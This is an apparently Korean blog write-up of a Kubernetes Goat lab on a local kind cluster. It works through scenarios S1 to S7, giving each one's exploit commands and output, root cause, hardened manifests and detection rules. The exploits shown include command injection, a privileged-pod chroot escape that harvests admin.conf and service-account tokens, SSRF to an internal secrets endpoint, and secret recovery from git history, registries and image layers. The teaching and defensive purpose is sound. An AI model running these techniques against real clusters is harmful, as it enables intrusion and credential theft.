---
layout: post
title: "Kubernetes Goat로 배우는 쿠버네티스 클러스터 보안"
date: 2026-07-24
category: 시스템
author: WTCY
tags: [KubernetesGoat, Kubernetes, Docker, 컨테이너보안, 클라우드보안, ContainerEscape, RBAC, SSRF, CommandInjection, PrivilegeEscalation, kind, 모의침투]
excerpt: "의도적 취약 클러스터 Kubernetes Goat를 kind로 직접 구축해 컨테이너 이스케이프·RBAC 오구성·시크릿 노출·SSRF·NodePort 노출 등 10개 시나리오를 실제 익스플로잇하고, 각 취약점의 근본 원인과 수정 매니페스트·탐지까지 분석한 실습 기록."
---

> 의도적으로 취약하게 설계된 **[Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat)** 클러스터를 로컬 `kind` 환경에 직접 구축하고,
> 공격자 관점에서 **10가지 시나리오를 실제로 익스플로잇**하면서 컨테이너·쿠버네티스 보안의 근본 원리와 대응 방안을 정리한 실습 기록입니다.
> 개념 정리 → 환경 구축 → 정찰 → 익스플로잇 → 근본 원인 분석 → 수정 매니페스트 → 탐지까지 전 과정을 다룹니다.
>
> **실습 환경**: kind v0.32.0 · Kubernetes v1.36.1 · Docker 29.2.1 · Helm 4.2.3

---

## 1. 들어가며

컨테이너와 쿠버네티스는 현대 인프라의 사실상 표준이 되었지만, **"기본값(default)이 곧 안전"은 아닙니다.** 오히려 쿠버네티스의 기본 설정은 *개발 편의성*에 최적화되어 있어, 아무 생각 없이 배포한 워크로드 하나가 노드 전체와 클러스터 관리 권한으로 이어지는 경우가 흔합니다.

실제 사고들이 이를 증명합니다.

- **Tesla (2018)** — 인증 없이 노출된 Kubernetes Dashboard를 통해 공격자가 클러스터에 침투, AWS 자격증명을 탈취하고 크립토마이너를 실행했습니다.
- **Capital One (2019)** — WAF의 **SSRF** 취약점으로 클라우드 메타데이터(IMDS)에 접근, IAM 자격증명을 탈취해 1억 건 이상의 고객 정보가 유출됐습니다. (본 실습 S4와 정확히 같은 원리)
- **크립토재킹 캠페인들** — 인증 없는 kubelet(10250)·etcd(2379)·Docker API(2375) 노출을 스캔해 컨테이너를 대량 배포하는 봇넷이 지금도 활동 중입니다.

이 문서는 이런 공격들이 **"어떻게, 왜"** 성립하는지를 실습으로 몸에 익히는 것을 목표로 합니다. 크게 두 파트입니다.

- **Part 1 (2~3장)** — 실습을 이해하는 데 필요한 Docker/Kubernetes 핵심 개념 심화.
- **Part 2 (5~8장)** — Kubernetes Goat 10개 시나리오를 실제로 익스플로잇하고, 각 취약점의 근본 원인과 수정 방법을 매니페스트 수준에서 분석.

> ###  실습 윤리 & 안전
> 모든 공격은 **로컬 `kind` 클러스터(개인 PC)**에서만 수행했습니다. Kubernetes Goat는 학습용으로 설계된 *의도적 취약* 환경이며, 실제 운영 클러스터나 타인의 시스템에 동일 기법을 적용하는 것은 **불법**입니다. DoS 시나리오(S9)는 호스트 안정성을 위해 **구조적 취약성 증명까지만** 수행하고 실제 자원 폭탄은 실행하지 않았습니다. 문서에 등장하는 모든 시크릿/키는 Goat가 배포한 **더미 값**입니다.

### TL;DR

- 외부에 노출된 **웹앱 한 개의 커맨드 인젝션**으로 컨테이너 내부 `root` 셸을 획득했습니다.
- `privileged` + `hostPID` + `hostPath(/)`로 배포된 파드에서 **`chroot` 한 번**으로 노드를 탈출, 컨트롤플레인의 `admin.conf`(cluster-admin 자격증명)와 **32개의 서비스어카운트 토큰**을 탈취해 **클러스터 전체를 장악**했습니다.
- Git 히스토리·Docker 이미지 레이어·비인증 레지스트리·SSRF·RBAC 오구성을 통해 **7종의 시크릿**을 평문으로 확보했습니다.
- 성공한 모든 공격의 공통 원인은 결국 **"위험한 기본값을 방치한 것"**이었고, 네 가지 통제(non-root 실행 · privileged/hostPath 금지 · 최소권한 RBAC · 기본 거부 NetworkPolicy)만으로 CRITICAL 체인과 대부분의 유출을 끊을 수 있었습니다.

---

## 2. 배경지식 ① — Docker 심화

쿠버네티스 보안을 이해하려면 그 밑에 깔린 컨테이너 원리부터 알아야 합니다. **컨테이너는 경량 VM이 아니라, 호스트 커널을 공유하는 격리된 프로세스**입니다. 바로 이 "공유"가 뒤에서 볼 이스케이프의 근본 배경입니다.

<p align="center"><img src="/assets/img/kubernetes-goat/diagram-1-container-vs-vm.png" alt="컨테이너는 호스트 커널을 공유한다 — VM과 달리 격리가 약해, 커널 설정이 잘못되면 벽이 무너진다" width="560" style="max-width:100%;height:auto"></p>
<p align="center"><em>▲ 컨테이너는 호스트 커널을 공유한다 — VM과 달리 격리가 약해, 커널 설정이 잘못되면 벽이 무너진다</em></p>

VM은 App마다 별도 커널을 갖지만, 컨테이너는 **하나의 호스트 커널을 공유**하고 namespace/cgroup으로만 갈라놓습니다. 격리가 약한 만큼, 커널 수준 설정이 잘못되면 컨테이너 사이의 벽이 무너집니다.

### 2.1 이미지와 레이어 — "삭제해도 남는다"

Docker 이미지는 **읽기 전용 레이어의 스택**이며, OverlayFS 같은 유니온 파일시스템으로 병합됩니다. Dockerfile의 각 명령(`RUN`, `COPY`, `ADD`)이 새 레이어를 만듭니다.

```
┌─────────────────────────┐  ← 컨테이너 쓰기 레이어 (R/W)
├─────────────────────────┤  ← RUN rm secret.txt   (삭제 마커만 추가)
├─────────────────────────┤  ← ADD secret.txt      (★ 파일 실체가 여기 그대로!)
├─────────────────────────┤  ← RUN apt-get ...
└─────────────────────────┘  ← FROM alpine (베이스)
```

핵심은 **레이어가 불변(immutable)이라는 점**입니다. 상위 레이어에서 파일을 "삭제"해도 하위 레이어의 실체는 그대로 남아, `docker save`로 이미지를 풀면 복원됩니다. → **S6에서 직접 익스플로잇합니다.**

### 2.2 격리의 3요소

| 요소 | 질문 | 종류 / 예 | 무너지면 |
|---|---|---|---|
| **namespace** | *무엇을 볼 수 있는가?* | `pid`, `net`, `mnt`, `uts`, `ipc`, `user`, `cgroup` (7종) | `hostPID`→호스트 프로세스 관찰, `hostNetwork`→호스트 네트워크 |
| **cgroup** | *얼마나 쓸 수 있는가?* | CPU·메모리·PID 수 제한 (v1/v2) | 제한 없으면 자원 고갈 DoS (**S9**) |
| **capabilities** | *무엇을 할 수 있는가?* | `CAP_NET_ADMIN`, `CAP_SYS_ADMIN`, ... (약 40종) | `privileged`=전체 capability→사실상 호스트 root (**S3**) |

> `privileged: true`는 이 세 가지를 한 번에 무력화합니다: 모든 capability 부여, 모든 디바이스 접근, 각종 보안 프로필(seccomp/AppArmor) 해제. 그래서 privileged 파드 = "컨테이너라는 이름의 호스트 프로세스"에 가깝습니다.

### 2.3 네트워크와 볼륨

- **네트워크**: `bridge`(기본, NAT) / `host`(호스트 네트워크 직접 사용) / `none` / `overlay`(멀티호스트). 컨테이너가 `host` 네트워크를 쓰면 호스트의 모든 인터페이스·localhost 서비스에 접근합니다.
- **볼륨**: `bind mount`(호스트 경로 직접 마운트) / `named volume`(Docker 관리) / `tmpfs`(메모리). 쿠버네티스의 `hostPath`가 bind mount에 해당하며, **`hostPath: /`는 호스트 루트 전체를 컨테이너에 내주는 것**입니다. → **S3.**

### 2.4 Docker 소켓의 위험

`/var/run/docker.sock`은 Docker 데몬의 제어 소켓입니다. 이 소켓에 접근할 수 있으면 **`--privileged`에 호스트 `/`를 마운트한 새 컨테이너를 띄워** 즉시 호스트를 장악할 수 있습니다. "컨테이너 안에서 도커를 쓰겠다(DinD/CI)"는 편의가 곧 탈출 통로가 됩니다.

>  본 실습 클러스터는 `kind`(containerd 기반)라 Docker 소켓 시나리오는 플레이스홀더로 존재하지만, 동일한 원리의 **실제 노드 탈출은 S3에서 hostPath로 완전히 재현**했습니다.

---

## 3. 배경지식 ② — Kubernetes 심화

쿠버네티스는 다수의 컨테이너를 **선언적(declarative)**으로 배포·확장·복구하는 오케스트레이터입니다.

### 3.1 아키텍처

<p align="center"><img src="/assets/img/kubernetes-goat/diagram-2-k8s-architecture.png" alt="쿠버네티스 아키텍처 — 컨트롤플레인(apiserver·etcd)과 노드(kubelet·containerd) 구성요소" width="560" style="max-width:100%;height:auto"></p>
<p align="center"><em>▲ 쿠버네티스 아키텍처 — 컨트롤플레인(apiserver·etcd)과 노드(kubelet·containerd) 구성요소</em></p>

- **kube-apiserver** — 모든 요청의 관문(REST API). 인증·인가(RBAC)·어드미션이 여기서 일어남.
- **etcd** — 클러스터의 모든 상태와 **Secret이 저장되는 곳**(기본은 평문). etcd 접근 = 클러스터의 모든 비밀.
- **kubelet** — 각 노드에서 파드를 실제로 실행. 10250 포트가 인증 없이 열리면 임의 명령 실행 위험.
- **container runtime(containerd)** — 컨테이너를 만드는 실체.

> **S3의 노드 탈출이 곧 클러스터 장악인 이유**: 단일 노드 kind에서는 노드가 곧 컨트롤플레인이라, 노드의 `/etc/kubernetes/admin.conf`(cluster-admin 인증서)와 etcd, 모든 kubelet 자격증명이 그 파일시스템에 있습니다.

### 3.2 핵심 오브젝트 (예시 YAML)

| 오브젝트 | 역할 |
|---|---|
| **Pod** | 배포 최소 단위. 1개 이상 컨테이너 + 공유 네트워크/볼륨. 기본적으로 **SA 토큰이 자동 마운트**됨 |
| **Deployment** | Pod의 원하는 개수·버전을 유지(롤링 업데이트·자가치유) |
| **Service** | 파드 집합에 안정적 IP/DNS 부여. `ClusterIP`(내부) / `NodePort`(모든 노드 포트 개방) / `LoadBalancer` |
| **Namespace** | 리소스의 논리적 경계. **단, 네트워크·노드는 기본적으로 격리하지 않음** |
| **ConfigMap / Secret** | 설정·민감정보 주입. Secret은 **암호화가 아니라 base64 인코딩**일 뿐 |
| **ServiceAccount** | 파드의 신원(identity). 토큰으로 API 서버에 인증 |
| **Role/ClusterRole + Binding** | RBAC. 권한(무엇을) + 바인딩(누구에게) |

```yaml
# 최소 Pod 예시 — 여기에 securityContext가 없으면 root로 구동됨
apiVersion: v1
kind: Pod
metadata: { name: demo }
spec:
  containers:
    - name: app
      image: nginx
      # securityContext 부재 = UID 0(root) + 기본 capability 세트
```

### 3.3 ServiceAccount와 토큰

모든 파드에는 기본적으로 `/var/run/secrets/kubernetes.io/serviceaccount/`에 **토큰 · CA 인증서 · 네임스페이스**가 마운트됩니다. 공격자가 파드를 장악하면 이 토큰으로 곧바로 API 서버에 인증할 수 있고, **그 SA에 부여된 RBAC 권한이 곧 공격자의 권한**이 됩니다. → **S8.**

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/...
```

불필요하면 `automountServiceAccountToken: false`로 꺼야 합니다.

### 3.4 RBAC 모델

```
[Role / ClusterRole]  =  권한 규칙 (apiGroups × resources × verbs)
        +
[RoleBinding / ClusterRoleBinding]  =  주체(User/Group/ServiceAccount) 연결
```

흔한 실수 두 가지: ① `cluster-admin`을 SA에 그대로 바인딩(**S7-A**), ② `resources: ["*"]`, `verbs: ["*"]` 와일드카드(**S7-B**). 둘 다 "일단 되게 하려고" 넓게 준 권한이 사고로 이어집니다.

### 3.5 Pod Security Standards (PSS)

쿠버네티스가 정의한 3단계 프로파일. **Pod Security Admission(PSA)**으로 네임스페이스 단위 강제합니다.

| 프로파일 | 내용 |
|---|---|
| `privileged` | 제한 없음 (위험) |
| `baseline` | 최소 제한 — privileged·hostPath·hostPID 등 금지 |
| `restricted` | 강력 제한 — non-root 강제, capability drop, seccomp 필수 |

> `restricted`만 강제해도 **S2·S3·S9가 원천 차단**됩니다.

### 3.6 Secret의 실체

쿠버네티스 Secret은 etcd에 **base64(평문)**로 저장됩니다. "Secret 오브젝트에 넣었으니 안전"이 아니라 **① 누가 그것을 `get` 할 수 있는가(RBAC)**, **② etcd가 암호화·접근통제되는가**가 실제 보안을 결정합니다.

```bash
echo 'azhzLWdvYXQtMTIz' | base64 -d   # 누구나 디코드 가능
```

---

## 4. 실습 환경 구축

클라우드 비용 없이 노트북에서 완결되도록 **`kind`(Kubernetes IN Docker)** 단일 노드 클러스터를 사용했습니다. Docker Desktop(WSL2 백엔드) 위에 kind가 컨테이너 하나를 "노드"로 띄우고, 그 안에서 컨트롤플레인과 워크로드가 함께 돕니다.

<p align="center"><img src="/assets/img/kubernetes-goat/diagram-3-kind-env.png" alt="실습 환경 — Docker Desktop(WSL2) 위에 kind가 노드 컨테이너를 띄우고, 포트포워딩으로 공격자가 접근" width="560" style="max-width:100%;height:auto"></p>
<p align="center"><em>▲ 실습 환경 — Docker Desktop(WSL2) 위에 kind가 노드 컨테이너를 띄우고, 포트포워딩으로 공격자가 접근</em></p>

### 4.1 도구 설치

```bash
# kubectl은 사전 설치되어 있었고, kind·helm을 winget으로 설치
winget install -e --id Kubernetes.kind    # kind v0.32.0
winget install -e --id Helm.Helm          # helm v4.2.3

git clone https://github.com/madhuakula/kubernetes-goat.git
```

### 4.2 클러스터 생성 & Goat 배포

```bash
cd kubernetes-goat/platforms/kind-setup
kind create cluster --config kind-cluster-setup.yaml --name kubernetes-goat-cluster
#  => Kubernetes v1.36.1 단일 컨트롤플레인 노드

cd ../..
bash setup-kubernetes-goat.sh    # insecure-rbac SA, metadata-db(helm), 취약 매니페스트 일괄 배포
bash access-kubernetes-goat.sh   # 각 시나리오를 1230~1236 포트로 포트포워딩
```

### 4.3 트러블슈팅 메모

- **Docker 데몬 미기동** — Docker Desktop을 먼저 실행해 `dockerDesktopLinuxEngine` 파이프가 뜬 뒤 kind를 생성.
- **Helm 4 + apiVersion v1 차트** — Goat의 `metadata-db` 차트는 Helm 2 시절의 `apiVersion: v1`이지만 Helm 4에서도 정상 설치됨.
- **이미지 Pull 시간** — 최초 배포 시 이미지가 커서 모든 파드가 `Running`이 되기까지 약 2~3분 소요. `access` 스크립트 실행 전 아래로 확인.

### 4.4 배포 검증

```console
$ kubectl get pods -A | grep -v kube-system
NAMESPACE           NAME                                  READY   STATUS
big-monolith        hunger-check-deployment-...           1/1     Running
default             build-code-deployment-...             1/1     Running
default             health-check-deployment-...           1/1     Running
default             internal-proxy-deployment-...         2/2     Running
default             kubernetes-goat-home-deployment-...   1/1     Running
default             metadata-db-...                       1/1     Running
default             poor-registry-deployment-...          1/1     Running
default             system-monitor-deployment-...         1/1     Running
secure-middleware   cache-store-deployment-...            1/1     Running
```

<p align="center"><img src="/assets/img/kubernetes-goat/01-goat-home.png" alt="Kubernetes Goat 홈" width="560" style="max-width:100%;height:auto"></p>
<p align="center"><em>▲ <code>http://127.0.0.1:1234</code> — Kubernetes Goat 대시보드. 좌측 메뉴가 각 취약 시나리오로 연결된다.</em></p>

---

## 5. 위협 모델과 공격 체인

**공격자 가정** — "외부에 노출된 웹앱 한 개에 접근할 수 있는 사람". 목표는 초기 발판(웹앱)에서 시작해 **노드 → 클러스터 관리 권한**까지 상승하는 것. 아래는 이번 실습에서 실제로 이은 공격 그래프입니다.

<p align="center"><img src="/assets/img/kubernetes-goat/diagram-4-attack-chain.png" alt="이번 실습에서 실제로 이은 공격 그래프 — 웹앱 발판에서 노드 탈출을 거쳐 클러스터 장악까지" width="560" style="max-width:100%;height:auto"></p>
<p align="center"><em>▲ 이번 실습에서 실제로 이은 공격 그래프 — 웹앱 발판에서 노드 탈출을 거쳐 클러스터 장악까지</em></p>

### MITRE ATT&CK for Containers 매핑

| 전술(Tactic) | 기법(Technique) | 시나리오 |
|---|---|---|
| Initial Access | Exploit Public-Facing Application (T1190) | S1·S2·S4·S5 |
| Execution | Command and Scripting Interpreter (T1059) | S2 |
| Privilege Escalation | Escape to Host (T1611) | **S3** |
| Credential Access | Unsecured Credentials (T1552) | S1·S5·S6 |
| Credential Access | Steal Application Access Token (T1528) | S8 |
| Discovery | Container/Cloud Service Discovery (T1613/T1580) | S10 |
| Lateral Movement | Use Alternate Auth Material (T1550) | S3·S8 |
| Impact | Resource Hijacking / Endpoint DoS (T1496/T1499) | S9 |

**심각도 높음** — 🔴 `CRITICAL` 클러스터/노드 장악 · 🟠 `HIGH` RCE·시크릿 대량유출 · 🟡 `MEDIUM` 민감정보 노출 · 🔵 `LOW` 정보수집·표면확대

---

## S1 · 코드베이스에 노출된 민감 키 `MEDIUM`

**취약점 클래스**: CWE-538 (Insertion of Sensitive Information into Externally-Accessible File) · CWE-312 (Cleartext Storage)

**개념** — `build-code` 서비스는 CI/CD 산출물을 웹으로 서빙하면서 `.git` 디렉터리째 노출합니다. 개발자가 실수로 커밋한 시크릿을 이후 커밋에서 "삭제"해도, Git은 **모든 리비전을 보존**하므로 히스토리에서 복원할 수 있습니다.

### 정찰

```bash
$ curl -s http://127.0.0.1:1230/.git/config      # .git 노출 확인
[core] repositoryformatversion = 0 ...

$ curl -s http://127.0.0.1:1230/.git/logs/HEAD    # 커밋 히스토리 열람
... commit: Inlcuded custom environmental variables   # ← 수상한 커밋
... commit: updated the endpoints and routes          # ← 여기서 삭제됨
```

### 익스플로잇

```bash
# 히스토리 전체에서 시크릿의 생애를 추적 (git log -p -S: 문자열 추가/삭제 커밋 검색)
$ git log -p -S "AKIVSHD6243H22G1KIDC" --oneline
d7c173a  Inlcuded custom environmental variables
  +aws_access_key_id = AKIVSHD6243H22G1KIDC
  +aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M
7daa5f4  updated the endpoints and routes
  -aws_access_key_id = AKIVSHD6243H22G1KIDC   # "삭제"했지만 히스토리에 영구 보존
```

<p align="center"><img src="/assets/img/kubernetes-goat/11-buildcode.png" alt="git 히스토리에서 AWS 키 복원" width="560" style="max-width:100%;height:auto"></p>

### 근본 원인

1. 웹 루트에 `.git` 디렉터리 노출 (웹서버 설정 미비)
2. 시크릿을 소스 코드에 하드코딩
3. **"커밋 후 `rm`하면 폐기된다"는 오해** — Git은 객체를 참조하는 한 영구 보존

### 대응

```nginx
# 웹서버에서 .git 접근 차단 (nginx 예시)
location ~ /\.git { deny all; return 404; }
```

- `.gitignore`로 `.env`·자격증명 파일 제외, **Secret Manager/Vault**로 런타임 주입
- 커밋 전 **gitleaks / trufflehog** 훅으로 시크릿 스캔
- 이미 유출된 키는 히스토리 삭제만으로 무효화되지 않으므로 **즉시 폐기·회전(rotate)**

### 탐지

- CI에 `gitleaks detect` 통합, 공개 저장소 시크릿 모니터링, AWS CloudTrail에서 유출 키 사용 이상탐지

---

## S2 · 커맨드 인젝션 → 컨테이너 RCE `HIGH`

**취약점 클래스**: CWE-78 (OS Command Injection) + CWE-250 (Execution with Unnecessary Privileges)

**개념** — `health-check`는 "서버 핑 체크" 웹앱입니다. 소스(Go/fiber)를 보면 사용자 입력을 셸 명령에 **그대로 문자열 연결**합니다.

```go
// main.go — 전형적인 OS Command Injection
endpoint := c.FormValue("endpoint")
cmd := exec.Command("sh", "-c", "ping -c 2 "+endpoint)  // ← 입력 검증 전무
```

`sh -c "ping -c 2 " + 입력` 구조라, 입력에 `;`·`|`·`$()`를 넣으면 임의 명령이 실행됩니다.

### 익스플로잇

```bash
$ curl -s -X POST http://127.0.0.1:1231/ \
     --data-urlencode 'endpoint=127.0.0.1; id; hostname; uname -r'
...
uid=0(root) gid=0(root) groups=0(root)
health-check-deployment-55f896d98c-6879x
6.6.87.2-microsoft-standard-WSL2
```

<p align="center"><img src="/assets/img/kubernetes-goat/07-rce-result.png" alt="커맨드 인젝션으로 root 명령 실행" width="560" style="max-width:100%;height:auto"></p>
<p align="center"><em>▲ 실제 웹 응답 화면 — "Response Output"에 ping 결과와 함께 <code>uid=0(root)</code>가 그대로 출력된다.</em></p>

세미콜론 뒤 명령이 **컨테이너 root로 실행**됨을 확인. 여기서부터 리버스 셸·SA 토큰 탈취(S8)·내부 정찰(S10)로 확장됩니다.

### 근본 원인

- 입력을 셸에 문자열 연결 (셸 메타문자 미필터)
- **컨테이너가 root(UID 0)로 구동** — non-root였다면 후속 피해가 크게 줄었을 것

### 대응

```go
// ① 셸을 거치지 말고 인자 배열로 실행 (셸 해석 자체를 제거)
cmd := exec.Command("ping", "-c", "2", host)
// ② + 입력 화이트리스트: 호스트명/IP 정규식 검증
```

```yaml
# ③ 파드는 non-root + 최소 권한으로
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities: { drop: ["ALL"] }
```

### 탐지

- Falco 룰: 컨테이너 안에서 `sh`/`bash`가 웹 프로세스의 자식으로 spawn되는 이벤트 탐지

---

## S3 · 컨테이너 이스케이프 → 클러스터 장악 `CRITICAL`

**취약점 클래스**: CWE-250 · MITRE T1611 (Escape to Host). **이번 실습의 핵심.**

`system-monitor` 파드는 인증 없는 웹 터미널(GoTTY)을 노출하는데, 그 파드 스펙 자체가 재앙입니다.

### 취약 매니페스트 원문 (`scenarios/system-monitor/deployment.yaml`)

```yaml
spec:
  hostPID: true          # ← 호스트 프로세스 네임스페이스 공유
  hostIPC: true          # ← 호스트 IPC 공유
  volumes:
  - name: host-filesystem
    hostPath:
      path: /            # ← 호스트 루트 전체를 볼륨으로
  containers:
  - name: system-monitor
    securityContext:
      allowPrivilegeEscalation: true
      privileged: true   # ← 전체 capability + 모든 디바이스
    volumeMounts:
    - name: host-filesystem
      mountPath: /host-system   # ← 컨테이너 /host-system = 호스트 /
```

즉 공격자는 웹 터미널(=파드 내 셸)에서 곧바로 **호스트 파일시스템 전체**를 읽고, `chroot`로 노드에 올라탈 수 있습니다.

### 익스플로잇

```bash
# [1] 모든 capability 보유 (privileged)
$ grep CapEff /proc/self/status  →  000001ffffffffff   # = 전체 권한

# [2] 호스트 /etc/shadow 읽기 (호스트 FS 접근 증명)
$ head -3 /host-system/etc/shadow  →  root:*:20591:0:99999:7:::

# [3] hostPID=true → 호스트·타 컨테이너 프로세스 관찰
$ ps aux | grep containerd  →  /usr/local/bin/containerd-shim ... (모든 파드)

# [4] chroot 한 번으로 노드 root 탈출
$ chroot /host-system /bin/sh -c "id; hostname"
uid=0(root) gid=0(root)  kubernetes-goat-cluster-control-plane   # 컨트롤플레인!
```

이 노드는 **컨트롤플레인**이므로, 노드 장악은 곧 **클러스터 장악**입니다. 호스트 파일시스템에서 관리자 자격증명과 모든 워크로드의 토큰을 쓸어 담습니다.

```bash
# 클러스터 cluster-admin 자격증명
$ ls -la /host-system/etc/kubernetes/admin.conf   →  -rw------- 5713 bytes
   server: https://kubernetes-goat-cluster-control-plane:6443
   client-certificate-data: LS0tLS1CRUdJTiBDRVJU...   # cluster-admin 인증서

# 이 노드의 모든 파드 서비스어카운트 토큰
$ find /host-system/var/lib/kubelet/pods -name token | wc -l   →  32
```

<p align="center"><img src="/assets/img/kubernetes-goat/09-container-escape.png" alt="컨테이너 이스케이프 전체 체인" width="560" style="max-width:100%;height:auto"></p>
<p align="center"><em>▲ privileged 웹 셸 → 전체 capability → 호스트 <code>/etc/shadow</code> → <code>chroot</code> 노드 root → <code>admin.conf</code> + SA 토큰 32개 탈취까지의 전체 체인</em></p>

### 근본 원인

`privileged: true` + `hostPID: true` + `hostPath: /`의 **삼중 조합**. 각각 capabilities·namespace·볼륨 격리를 동시에 무력화합니다. 게다가 웹 터미널에 **인증이 없어** 누구나 이 파드 셸에 접근할 수 있습니다.

### 대응 — 수정 매니페스트 (after)

```yaml
spec:
  # hostPID / hostIPC / hostPath 전부 제거
  automountServiceAccountToken: false
  containers:
  - name: system-monitor
    securityContext:
      privileged: false
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      readOnlyRootFilesystem: true
      capabilities: { drop: ["ALL"] }
      seccompProfile: { type: RuntimeDefault }
```

```yaml
# 네임스페이스에 restricted PSA 강제 → 위 위험 스펙은 애초에 거부됨
apiVersion: v1
kind: Namespace
metadata:
  name: default
  labels:
    pod-security.kubernetes.io/enforce: restricted
```

- 정책엔진(**Kyverno / OPA Gatekeeper**)으로 `privileged`·`hostPath` 파드 생성 자체를 차단
- 관리용 웹 터미널은 인증·**NetworkPolicy** 뒤에 배치

### 탐지

- Falco: `Launch Privileged Container`, `Change thread namespace`(chroot/nsenter), `Read sensitive file`(/etc/shadow) 룰

---

## S4 · 쿠버네티스 세계의 SSRF `HIGH`

**취약점 클래스**: CWE-918 (Server-Side Request Forgery)

**개념** — `internal-proxy`는 사용자가 준 URL을 **서버가 대신** 요청하는 프록시입니다(`spawnSync('curl',[endpoint,...])`). 공격자는 이를 이용해 외부에서 닿을 수 없는 **ClusterIP 내부 서비스**에 도달합니다 — 클라우드의 IMDS(169.254.169.254) 공격과 같은 원리이며, **Capital One 사고의 축소판**입니다.

```js
// 백엔드 server.js
app.post('/', (req,res) => {
  const child = spawnSync('curl', [endpoint, '-H', headers, '-X', method]);  // 목적지 검증 없음
});
```

### 익스플로잇

```bash
# 외부 미노출 내부 서비스(metadata-db, ClusterIP)에 SSRF로 도달
$ curl -s -X POST http://127.0.0.1:1232/ -H 'Content-Type: application/json' \
    -d '{"endpoint":"http://metadata-db/latest/secrets/","method":"GET","headers":"X: Y"}'
info
kubernetes-goat

# 시크릿 엔드포인트 열람
$ ... -d '{"endpoint":"http://metadata-db/latest/secrets/kubernetes-goat", ...}'
{"metadata":"static-metadata","data":"azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI="}
$ echo azhz...YjljYWI= | base64 -d  →  k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab
```

<p align="center"><img src="/assets/img/kubernetes-goat/08-ssrf-result.png" alt="SSRF로 내부 metadata 시크릿 획득" width="560" style="max-width:100%;height:auto"></p>

> 실제 클라우드였다면 이 자리에 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`를 넣어 **IAM 임시 자격증명**을 탈취했을 것입니다.

### 근본 원인

- 목적지 URL 검증 부재 (스킴·호스트·포트 무검증)
- 내부 서비스가 **인증 없이** 시크릿을 반환하는 "내부는 안전" 가정

### 대응

- 목적지 **allowlist**(허용 스킴/호스트/포트만) + 사설·링크로컬 대역(`169.254.0.0/16`, `10.0.0.0/8`, `127.0.0.0/8`) 차단
- 리다이렉트 추적 금지, DNS rebinding 방지
- **NetworkPolicy로 파드 egress 최소화**, 내부 서비스도 인증(mTLS) 적용

```yaml
# 기본 거부 egress NetworkPolicy 예시
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: default-deny-egress }
spec:
  podSelector: {}
  policyTypes: ["Egress"]
```

---

## S5 · 비인증 프라이빗 레지스트리 `MEDIUM`

**취약점 클래스**: CWE-306 (Missing Authentication) + CWE-312

**개념** — `poor-registry`는 Docker Registry v2 API를 **인증 없이** 노출합니다. 카탈로그를 훑어 이미지를 받고, 이미지 **config blob**(빌드 시 `ENV`·명령 이력)에서 하드코딩된 키를 캡니다.

### 익스플로잇

```bash
# ① 인증 없이 카탈로그 열람
$ curl -s http://127.0.0.1:1235/v2/_catalog
{"repositories":["madhuakula/k8s-goat-alpine","madhuakula/k8s-goat-users-repo"]}

# ② 매니페스트 → config blob digest
$ curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
     http://127.0.0.1:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest

# ③ config blob의 ENV에 박힌 시크릿
$ curl -s http://127.0.0.1:1235/v2/madhuakula/k8s-goat-users-repo/blobs/sha256:8705... \
     | tr ',' '\n' | grep -i key
"API_KEY=k8s-goat-cf658c56a501385205cc6d2dafee8fc1"
```

<p align="center"><img src="/assets/img/kubernetes-goat/10-registry.png" alt="비인증 레지스트리 이미지 ENV 시크릿" width="560" style="max-width:100%;height:auto"></p>

### 근본 원인

- 레지스트리 인증·인가 미설정 (익명 pull 허용)
- 빌드 인자/`ENV`에 시크릿 주입 → **이미지에 영구 각인**

### 대응

- 레지스트리 **인증·TLS·네트워크 격리**(사설망/방화벽), 익명 접근 차단
- 시크릿을 이미지에 굽지 말고 런타임 Secret/Vault로 주입
- **Trivy**로 이미지 시크릿·CVE 스캐닝을 CI에 통합

---

## S6 · 이미지 레이어에 숨은 비밀 `MEDIUM`

**취약점 클래스**: CWE-538 · CWE-312 (Docker 레이어 불변성 악용)

**개념** — Dockerfile에서 `ADD secret.txt` 후 다음 레이어에서 `rm` 해도, **이전 레이어 tar에는 파일이 그대로** 남습니다(2.1 참조). 이미지를 `docker save`해 레이어별로 풀면 "삭제된" 파일을 복원할 수 있습니다.

### 익스플로잇

```bash
# ① 레이어 히스토리로 "삭제" 흔적 발견
$ docker history --no-trunc madhuakula/k8s-goat-hidden-in-layers
RUN echo "..." >> /root/contribution.txt && rm -rf /root/secret.txt   # 삭제 레이어
ADD secret.txt /root/secret.txt                                        # 추가 레이어(여기 남음)

# ② 이미지를 풀어 모든 레이어 blob에서 secret.txt 복원
$ docker save madhuakula/k8s-goat-hidden-in-layers -o img.tar && tar xf img.tar
$ for b in blobs/sha256/*; do tar xOf "$b" root/secret.txt 2>/dev/null; done
k8s-goat-3b7a7dc7f51f4014ddf3446c25f8b772
```

### 근본 원인

레이어 불변성. **"다음 줄에서 지웠으니 안전"은 이미지에서 성립하지 않습니다.**

### 대응

- 시크릿을 절대 `ADD`/`COPY`하지 말 것
- 빌드 아티팩트가 필요하면 **multi-stage build**로 최종 이미지에서 분리
- BuildKit `--secret` 마운트로 빌드 타임 시크릿을 레이어에 남기지 않기
- 이미지 시크릿 스캐닝(Trivy `--scanners secret`)

---

## S7 · RBAC 최소권한 위반 `HIGH`

**취약점 클래스**: CWE-266/269 (Improper Privilege Management)

Goat 셋업은 두 가지 전형적 RBAC 실수를 심어둡니다.

### (A) cluster-admin에 묶인 서비스어카운트 — `scenarios/insecure-rbac/setup.yaml`

```yaml
kind: ClusterRoleBinding
metadata: { name: superadmin }
roleRef:
  kind: ClusterRole
  name: cluster-admin          # ← 최강 권한을
subjects:
  - kind: ServiceAccount
    name: superadmin           # ← 평범한 SA에 그대로 바인딩
    namespace: kube-system
```

이 SA를 사용하는 파드가 하나라도 뚫리면 **공격자가 즉시 클러스터 관리자**가 됩니다.

